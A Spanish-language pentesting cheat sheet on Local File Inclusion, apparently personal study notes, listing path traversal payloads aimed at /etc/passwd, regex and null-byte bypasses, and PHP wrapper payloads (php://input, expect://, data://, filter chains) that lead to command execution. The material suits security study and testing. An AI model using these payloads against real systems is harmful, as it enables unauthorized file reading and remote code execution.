#Inyeccion 
### LFI o Local File Inclusion

Podemos decir que encontramos esta vulnerabilidad cuando tenemos la capacidad de leer archivos internos de la maquina. 

------
#### Directory Path Traversal 
Cuando encontramos un parametro que realiza una peticion a un archivo de la maquina, podemos intentar un _Directory Path Traversal_. Estos son distintos **payloads** que se pueden probar en un parametro.

`../../../../../etc/passwd`
`....//....//....//....//etc/passwd`
`....//....//....//....//etc/passwd%00` --> Si las paginas tienen extension .php
`....//....//....//....//....//etc////././././//.////.//passwd`

Ir probando tambien poniendo /. al final --> `/etc/passwd/.` -> Ya que puede haber validaciones por nombre de archivo, o porque los ultimos caracteres NO sean passwd, etc...

---
#### Bypass de expresiones regulares
Podemos bypassearlas de varias formas:

`../../../../../../../et?/pas?w?`
`../../../../../../etc////././././pass??`

---
#### Concatenacion de Extensiones Obligatorias
Si el servidor obliga a que el archivo use la extension php por ejemplo, podemos bypassearlo poniendo un null byte (%00) al final. Tal que asi:
`../../../../../../../../etc/passwd%00`

---

#### Ademas, hay wrappers...
Podemos intentar injectar los siguientes wrappers en el parametro

 **URIs**: Una _URI_ (Uniform Resource Identifier) es una cadena de texto que **identifica un recurso** (como un archivo, una página web o un servicio) de forma única y estándar en Internet o en un sistema local. Su función es permitir que distintas aplicaciones —navegadores, parsers, programas— puedan localizar y acceder a ese recurso sin ambigüedad. Hay distinos URIs: <br>`file:///etc/passwd` -> Busca archivos locales del sistema. <br>`http://example.com` -> Realiza peticiones a una url HTTP. <br>`https://example.com` -> Lo mismo, pero cifrado.<br>`ftp://ftp.example.com/pub/data.txt` -> Descarga archivos por FTP.<br>`php://filter/read=convert.base64-encode/resource=/etc/passwd` -> Realiza peticiones, en este caso a recursos locales, por medio de php, averiguar para ver bien las funciones.<br>`php://input` --> Luego agregar en el cuerpo de la respuesta -> `<?php system("whoami");?>` --> Tiene que enviarse por **POST** <br>`expect://whoami` -> MUY poco comun, pero si esta, permite RCE.<br>`data://text/plain;base64,PD9waHAgc3lzdGVtKFwid2hvYW1pXCIpOz8+` --> RCE, por GET<br>`php://filter.......` --> Si la pagina es Usando el script php_filter_chain_generator.py, quizas podes obtener una RCE, averiguar mas pero es basicamente poner (en el parametro) <br>`?filename=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp` --> Todo este texto es para poner una H simplemente, pero vos insertas esto en la url y capaz se consigue RCE.

--------
#### Se puede derivar a RCE con [[Log Poisoning]]. 

